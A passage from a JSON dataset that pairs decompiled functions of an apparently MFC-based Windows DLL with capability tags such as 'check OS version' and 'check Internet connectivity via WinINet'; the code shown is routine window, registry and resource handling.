  (**(*piStack136 + 0x10))();\n                                }\n                                (**(*piVar1 + 0x10))(piVar1);\n                                return 0x8007000e;\n                            }\n                            fcn.18000b3a8(arg1 + 0x1e0, &iStack112);\n                        }\n                        if (piStack128 != NULL) {\n                            (**(*piStack128 + 0x10))();\n                        }\n                    }\n                    if (piStack136 != NULL) {\n                        (**(*piStack136 + 0x10))();\n                    }\n                }\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x10))(piVar1);\n                }\n            }\n            iVar7 = iVar7 + 1;\n        }\n        uVar4 = uVar3;\n    }\n    return uVar4;\n}\n",
        "token_count": 1160
    },
    "18000d7d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong * fcn.18000d7d8(ulong *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    \n    arg1[1] = 0;\n    *arg1 = arg2;\n    if (*0x180069978 == '\\0') {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"KERNEL32\");\n        if (iVar2 == 0) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            puVar3 = (*pcVar1)();\n            return puVar3;\n        }\n        *0x180069958 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"CreateActCtxW\");\n        *0x180069960 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"ReleaseActCtx\");\n        *0x180069968 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"ActivateActCtx\");\n        *0x180069970 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"DeactivateActCtx\");\n        if (*0x180069958 == 0) {\n            if (((*0x180069960 != 0) || (*0x180069968 != 0)) || (*0x180069970 != 0)) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                puVar3 = (*pcVar1)();\n                return puVar3;\n            }\n        }\n        else if (((*0x180069960 == 0) || (*0x180069968 == 0)) || (*0x180069970 == 0)) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            puVar3 = (*pcVar1)();\n            return puVar3;\n        }\n        *0x180069978 = '\\x01';\n    }\n    return arg1;\n}\n",
        "token_count": 434
    },
    "18000da3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18000da38(int64_t arg1)\n\n{\n    if (*(arg1 + 0x110) != 0) {\n        (**(**(arg1 + 0x110) + 0x28))();\n    }\n    if (*(arg1 + 0x124) != 0) {\n        fcn.1800285fc(arg1, L\"Settings\", L\"PreviewPages\", *(arg1 + 0x124));\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "18000dfe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18000dfec(int64_t *arg1)\n\n{\n    if ((*0x180069960 != NULL) && (*arg1 != -1)) {\n        if ((*0x180069970 != NULL) && (arg1[1] != 0)) {\n            arg1[1] = 0;\n            (**0x180069970)(0);\n        }\n        (**0x180069960)(*arg1);\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "18000ecb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18000ecbc(ulong arg1)\n\n{\n    int32_t iVar1;\n    int64_t *piVar2;\n    \n    piVar2 = fcn.180010ad4();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        piVar2 = (**(*piVar2 + 0xe8))(piVar2);\n    }\n    if (piVar2 != NULL) {\n        iVar1 = (**(*piVar2 + 0x250))(piVar2);\n        if ((iVar1 != 0) && (piVar2[0x1c] != 0)) {\n            (**(*piVar2[0x1c] + 200))(piVar2[0x1c], arg1);\n        }\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "18000ee3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18000ee30(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    int32_t *piVar2;\n    int32_t iVar3;\n    ushort *arg3_00;\n    uchar auStack648 [32];\n    int32_t aiStack616 [2];\n    int64_t iStack608;\n    ushort auStack600 [259];\n    ushort uStack82;\n    uint64_t uStack72;\n    \n    uStack72 = *0x180067ce0 ^ auStack648;\n    fcn.18000ecbc(0);\n    arg1_00 = fcn.18000ed24(0, &iStack608);\n    if (arg1_00 != iStack608) {\n        (*_sym.imp.USER32.dll_EnableWindow)(arg1_00, 1);\n    }\n    iVar3 = 0;\n    aiStack616[0] = 0;\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg1_00, aiStack616);\n    if ((((arg1_00 == 0) || (iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(),  aiStack616[0] != iVar1)) ||\n        (piVar2 = (*_sym.imp.USER32.dll_SendMessageW)(arg1_00, 0x376, 0),  piVar2 == NULL)) &&\n       (piVar2 = NULL,  arg1 != 0)) {\n        piVar2 = arg1 + 0xf0;\n    }\n    if ((piVar2 != NULL) && (iVar3 = *piVar2,  arg4 != 0)) {\n        *piVar2 = arg4 + 0x30000;\n    }\n    if ((arg3 & 0xf0) == 0) {\n        if ((arg3 & 0xf) < 2) {\n            arg3._0_4_ = arg3 | 0x30;\n        }\n        else if ((arg3 & 0xf) - 3 < 2) {\n            arg3._0_4_ = arg3 | 0x20;\n        }\n    }\n    auStack600[0] = 0;\n    if (arg1 == 0) {\n        arg3_00 = auStack600;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, auStack600, 0x104);\n        if (iVar1 == 0x104) {\n            uStack82 = 0;\n        }\n    }\n    else {\n        arg3_00 = *(arg1 + 0xa0);\n    }\n    fcn.18000ec04(arg1_00, arg2, arg3_00, arg3);\n    if (piVar2 != NULL) {\n        *piVar2 = iVar3;\n    }\n    if (iStack608 != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(iStack608, 1);\n    }\n    fcn.18000ecbc(1);\n    fcn.180032ea0(uStack72 ^ auStack648);\n    return;\n}\n",
        "token_count": 696
    },
    "18000f0d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.18000f0d0(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (*(arg1 + 0xb0) == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = (**(**(arg1 + 0xb0) + 0x20))();\n    }\n    return uVar1;\n}\n",
        "token_count": 86
    },
    "18000f1c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18000f1c8(int64_t arg1, int64_t *arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    ulong arg2_00;\n    uchar auStack648 [32];\n    int64_t aiStack616 [2];\n    ulong uStack600;\n    int64_t iStack592;\n    int64_t iStack584;\n    int64_t iStack576;\n    ulong uStack568;\n    uchar auStack552 [528];\n    uint64_t uStack24;\n    \n    uStack568 = 0xfffffffffffffffe;\n    uStack24 = *0x180067ce0 ^ auStack648;\n    iStack592 = arg1;\n    aiStack616[0] = fcn.180008f18(*arg2 + -0x18);\n    aiStack616[0] = aiStack616[0] + 0x18;\n    if ((arg1 == -0x80000000) && (iVar3 = fcn.180013610(),  iVar3 == 1)) {\n        arg2_00 = fcn.18000f0f4(&iStack576, L\"Software\\\\Classes\\\\\", aiStack616);\n        fcn.180008c54(aiStack616, arg2_00);\n        LOCK();\n        piVar1 = iStack576 + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar3 + -1 < 1) {\n            (**(**(iStack576 + -0x18) + 8))();\n        }\n        arg1 = -0x7fffffff;\n        iStack592 = -0x7fffffff;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)(arg1, aiStack616[0], &uStack600);\n    if (iVar3 == 0) {\n        do {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyW)(uStack600, 0, auStack552, 0x104);\n            if (iVar3 != 0) break;\n            fcn.1800087c4(&iStack584, auStack552);\n            iVar3 = fcn.18000f1c8(uStack600, &iStack584);\n            LOCK();\n            piVar1 = iStack584 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar2 + -1 < 1) {\n                (**(**(iStack584 + -0x18) + 8))();\n            }\n        } while (iVar3 == 0);\n        if ((iVar3 == 0x103) || (iVar3 == 0x3f2)) {\n            (*_sym.imp.ADVAPI32.dll_RegDeleteKeyW)(arg1, aiStack616[0]);\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack600);\n    }\n    LOCK();\n    piVar1 = aiStack616[0] + -8;\n    iVar3 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar3 + -1 < 1) {\n        (**(**(aiStack616[0] + -0x18) + 8))();\n    }\n    fcn.180032ea0(uStack24 ^ auStack648);\n    return;\n}\n",
        "token_count": 759
    },
    "18000fac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18000fac8(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    \n    if (*(arg1 + 0x20) == 0) {\n        iVar3 = fcn.18002a0c8(arg1 + 0x28, *(arg1 + 0x30), 0x18);\n        iVar1 = *(arg1 + 0x30);\n        puVar4 = iVar3 + -0x10 + iVar1 * 0x18;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar4 = *(arg1 + 0x20);\n            *(arg1 + 0x20) = puVar4;\n            puVar4 = puVar4 + -3;\n        }\n    }\n    puVar4 = *(arg1 + 0x20);\n    if (puVar4 != NULL) {\n        *(arg1 + 0x20) = *puVar4;\n        puVar4[1] = arg2;\n        *puVar4 = arg3;\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n        return;\n    }\n    fcn.180012514();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 321
    },
    "180010af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.180010afc(ulong noname_0, ulong *arg2)\n\n{\n    ulong uVar1;\n    \n    if (*(arg2 + 1) == 1) {\n        uVar1 = 0xffffffffffffffff;\n    }\n    else {\n        if (*(arg2 + 1) == 0xf) {\n            (*_sym.imp.USER32.dll_ValidateRect)(*arg2, 0);\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 109
    },
    "180010d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.180010d10(int64_t *arg1, int64_t arg2)\n\n{\n    code **ppcVar1;\n    int64_t iVar2;\n    code *arg1_00;\n    \n    ppcVar1 = (**(*arg1 + 0x50))();\n    do {\n        if (*ppcVar1 == NULL) {\n            return 0;\n        }\n        arg1_00 = ppcVar1[1];\n        if (*(arg2 + 8) < 0xc000) {\n            iVar2 = fcn.180015578(arg1_00, *(arg2 + 8), 0, 0);\n            if (iVar2 != 0) {\ncode_r0x000180010d56:\n                (**(iVar2 + 0x18))(arg1, *(arg2 + 0x10), *(arg2 + 0x18));\n                return 1;\n            }\n        }\n        else {\n            while (iVar2 = fcn.180015578(arg1_00, 0xc000, 0, 0),  iVar2 != 0) {\n                if (**(iVar2 + 0x10) == *(arg2 + 8)) goto code_r0x000180010d56;\n                arg1_00 = iVar2 + 0x20;\n            }\n        }\n        ppcVar1 = (**ppcVar1)();\n    } while( true );\n}\n",
        "token_count": 310
    },
    "180010df": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.180010df4(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    ulong uVar4;\n    int64_t *piVar5;\n    \n    iVar2 = fcn.1800140a8();\n    if (((*(iVar2 + 8) == 0) || (*arg1 != 0)) || (iVar1 = fcn.180010d10(*(iVar2 + 8), arg1),  iVar1 == 0)) {\n        iVar2 = fcn.1800140a8();\n        if (*(iVar2 + 8) == NULL) {\n            piVar3 = NULL;\n        }\n        else {\n            piVar3 = (**(**(iVar2 + 8) + 0xe8))();\n        }\n        if (piVar3 == NULL) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = piVar3[8];\n        }\n        iVar1 = fcn.180018110(iVar2, arg1);\n        if (iVar1 == 0) {\n            if (piVar3 != NULL) {\n                uVar4 = fcn.180017c38(*arg1);\n                piVar5 = fcn.180019674(uVar4);\n                if (piVar5 != piVar3) {\n                    uVar4 = (**(*piVar3 + 0x210))(piVar3, arg1);\n                    return uVar4;\n                }\n            }\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 344
    },
    "18001196": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.18001196c(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    ulong uVar4;\n    uchar auStack24 [24];\n    \n    iVar2 = fcn.180014058();\n    if (*(iVar2 + 8) == 0) {\n        uVar4 = 0;\n    }\n    else {\n        piVar3 = fcn.180010ad4();\n        if (piVar3 == NULL) {\n            piVar3 = NULL;\n        }\n        else {\n            piVar3 = (**(*piVar3 + 0xe8))(piVar3);\n        }\n        if ((piVar3 != NULL) && (iVar1 = (**(*piVar3 + 0x18))(piVar3, 0xe146, 0, 0, auStack24),  iVar1 != 0)) {\n            return 1;\n        }\n        iVar2 = fcn.180014058();\n        uVar4 = (**(**(iVar2 + 8) + 0x18))(*(iVar2 + 8), 0xe146, 0, 0, auStack24);\n    }\n    return uVar4;\n}\n",
        "token_count": 266
    },
    "180011e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t fcn.180011e28(int64_t *arg1)\n\n{\n    bool bVar1;\n    bool bVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int64_t *piVar10;\n    int64_t *hWnd;\n    ulong arg3;\n    uint32_t uVar11;\n    ulong uStack104;\n    \n    iVar8 = arg1[0x18];\n    iVar7 = arg1[0x17];\n    iVar6 = fcn.180014058();\n    uStack104 = *(iVar6 + 0x18);\n    if (arg1[0x16] != 0) {\n        iVar7 = fcn.180014058();\n        uStack104 = *(iVar7 + 0x18);\n        (*_sym.imp.KERNEL32.dll_FindResourceW)(uStack104, arg1[0x16], 5);\n        iVar7 = (*_sym.imp.KERNEL32.dll_LoadResource)(uStack104);\n    }\n    if (iVar7 != 0) {\n        iVar8 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar7);\n    }\n    if (iVar8 == 0) {\n        iVar8 = -1;\n    }\n    else {\n        iVar6 = fcn.1800117c0(arg1);\n        fcn.180017d54();\n        hWnd = NULL;\n        bVar3 = false;\n        bVar1 = false;\n        bVar2 = false;\n        if (((iVar6 != 0) &&\n            (iVar9 = (*_sym.imp.USER32.dll_GetDesktopWindow)(),  bVar1 = bVar3,  bVar2 = false,  iVar6 != iVar9)) &&\n           (iVar4 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar6),  iVar4 != 0)) {\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar6);\n            bVar2 = true;\n            piVar10 = fcn.180010ad4();\n            if (piVar10 != NULL) {\n                hWnd = (**(*piVar10 + 0xe8))(piVar10);\n            }\n            if (((hWnd != NULL) && (iVar4 = (**(*hWnd + 0x250))(hWnd),  iVar4 != 0)) &&\n               (iVar4 = fcn.18001bea8(hWnd),  iVar4 != 0)) {\n                fcn.18001bed8(hWnd, 0);\n                bVar1 = bVar2;\n            }\n        }\n        fcn.180019f48(arg1);\n        arg3 = fcn.180017c38(iVar6);\n        iVar4 = fcn.180011bb8(arg1, iVar8, arg3, uStack104);\n        if (iVar4 != 0) {\n            if ((*(arg1 + 0xf) & 0x10) != 0) {\n                uVar5 = fcn.18001bd28(arg1);\n                uVar11 = 4;\n                if ((uVar5 >> 8 & 1) != 0) {\n                    uVar11 = 5;\n                }\n                fcn.180017570(arg1, uVar11);\n            }\n            if (arg1[8] != 0) {\n                fcn.18001c040(arg1, 0, 0, 0);\n            }\n        }\n        if (bVar1) {\n            fcn.18001bed8(hWnd, 1);\n        }\n        if (bVar2) {\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar6, 1);\n        }\n        if ((iVar6 != 0) && (iVar8 = (*_sym.imp.USER32.dll_GetActiveWindow)(),  iVar8 == arg1[8])) {\n            (*_sym.imp.USER32.dll_SetActiveWindow)(iVar6);\n        }\n        (**(*arg1 + 0xc0))(arg1);\n        fcn.18001181c(arg1);\n        if (arg1[0x16] != 0) {\n            (*_sym.imp.KERNEL32.dll_FreeResource)(iVar7);\n        }\n        iVar8 = *(arg1 + 0x11);\n    }\n    return iVar8;\n}\n",
        "token_count": 947
    },
    "1800123c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.1800123cc(int64_t *arg1)\n\n{\n    if (0 < *(arg1 + 1)) {\n        (**(*arg1 + 8))(arg1, 1);\n    }\n    return;\n}\n",
        "token_count": 51
    },
    "180012ff": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180012ff8(code **arg1)\n\n{\n    ulong uVar1;\n    \n    *arg1 = vtable.CDC.0;\n    if (arg1[1] != NULL) {\n        uVar1 = fcn.180012fa8(arg1);\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "18001335": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.180013354(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (*(arg1 + 8) == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.180013310(arg1);\n        uVar1 = (*_sym.imp.GDI32.dll_DeleteObject)(uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 92
    },
    "18001369": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180013690(code **arg1)\n\n{\n    ulong *puVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    ulong arg1_00;\n    \n    *arg1 = vtable.AFX_MODULE_THREAD_STATE.0;\n    if (arg1[0xf] != NULL) {\n        (**(*arg1[0xf] + 0x288))();\n    }\n    fcn.1800096a4(arg1[0x12]);\n    puVar1 = arg1[5];\n    if (puVar1 != NULL) {\n        (***puVar1)(puVar1, 1);\n    }\n    puVar1 = arg1[6];\n    if (puVar1 != NULL) {\n        (***puVar1)(puVar1, 1);\n    }\n    puVar1 = arg1[7];\n    if (puVar1 != NULL) {\n        (***puVar1)(puVar1, 1);\n    }\n    puVar1 = arg1[8];\n    if (puVar1 != NULL) {\n        (***puVar1)(puVar1, 1);\n    }\n    puVar1 = arg1[9];\n    if (puVar1 != NULL) {\n        (***puVar1)(puVar1, 1);\n    }\n    if (arg1[0xe] != NULL) {\n        iVar3 = *(arg1[0xe] + 0x18);\n        while (iVar3 != 0) {\n            arg1_00 = fcn.18002d5e4(arg1[0xe]);\n            fcn.1800096a4(arg1_00);\n            iVar3 = *(arg1[0xe] + 0x18);\n        }\n    }\n    piVar2 = arg1[0xc];\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 8))(piVar2, 1);\n    }\n    piVar2 = arg1[0xd];\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 8))(piVar2, 1);\n    }\n    piVar2 = arg1[0xe];\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 8))(piVar2, 1);\n    }\n    return;\n}\n",
        "token_count": 507
    },
    "18001452": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.180014520(void)\n\n{\n    uchar auStack216 [32];\n    uint uStack184;\n    uchar auStack180 [156];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180067ce0 ^ auStack216;\n    fcn.180033c90(auStack180, 0, 0x90);\n    uStack184 = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&uStack184);\n    fcn.180032ea0(uStack24 ^ auStack216);\n    return;\n}\n",
        "token_count": 129
    },
    "1800146f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.1800146f8(int32_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.180014580();\n    if (iVar1 == 0) {\n        if (((arg2 & 3) == 0) &&\n           ((((arg1[2] < 1 || (arg1[3] < 1)) || (iVar1 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0),  iVar1 <= *arg1))\n            || (iVar1 = (*_sym.imp.USER32.dll_GetSystemMetrics)(1),  iVar1 <= arg1[1])))) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 0x12340042;\n        }\n        return uVar2;\n    }\n    uVar2 = (**0x18006cc30)(arg1, arg2);\n    return uVar2;\n}\n",
        "token_count": 209
    },
    "1800147e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.1800147e4(int64_t arg1, uint32_t *arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    ulong uStack24;\n    ulong uStack16;\n    \n    iVar1 = fcn.180014580();\n    if (iVar1 == 0) {\n        if ((((arg1 != 0x12340042) || (arg2 == NULL)) || (*arg2 < 0x28)) ||\n           (iVar1 = (*_sym.imp.USER32.dll_SystemParametersInfoA)(0x30, 0, &uStack24, 0),  iVar1 == 0)) {\n            return 0;\n        }\n        arg2[1] = 0;\n        arg2[2] = 0;\n        uVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n        iVar1 = 1;\n        arg2[3] = uVar2;\n        uVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(1);\n        arg2[9] = 1;\n        *(arg2 + 5) = uStack24;\n        *(arg2 + 7) = uStack16;\n        arg2[4] = uVar2;\n        if (*arg2 < 0x68) {\n            return 1;\n        }\n        pcVar3 = \"DISPLAY\";\n    }\n    else {\n        iVar1 = (**0x18006cc40)(arg1, arg2);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        if (*0x18006cc5c != 0) {\n            return iVar1;\n        }\n        if (*arg2 < 0x68) {\n            return iVar1;\n        }\n        pcVar3 = arg2 + 10;\n    }\n    (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, pcVar3, 0xffffffff, arg2 + 10, 0x20);\n    return iVar1;\n}\n",
        "token_count": 448
    },
    "1800148c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.1800148cc(int64_t *arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    ushort *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uint32_t *puVar11;\n    uint *puVar12;\n    uint auStackX8 [2];\n    uint16_t in_stack_00000028;\n    int64_t *in_stack_00000030;\n    ushort *in_stack_00000038;\n    uint *in_stack_00000048;\n    int64_t iStack200;\n    int64_t iStack192;\n    int64_t iStack184;\n    int64_t *apiStack168 [4];\n    int64_t *piStack136;\n    int64_t aiStack128 [3];\n    int64_t iStack104;\n    int64_t iStack96;\n    int64_t iStack88;\n    ulong uStack80;\n    ushort auStack72 [16];\n    uint64_t uVar10;\n    \n    uVar10 = 0;\n    auStack72[0] = 0;\n    if (arg1 == NULL) {\n        return -0x7ff8ffa9;\n    }\n    if (in_stack_00000030 == NULL) {\n        return -0x7ffdfff8;\n    }\n    uVar1 = *(in_stack_00000030 + 2);\n    if (5 < 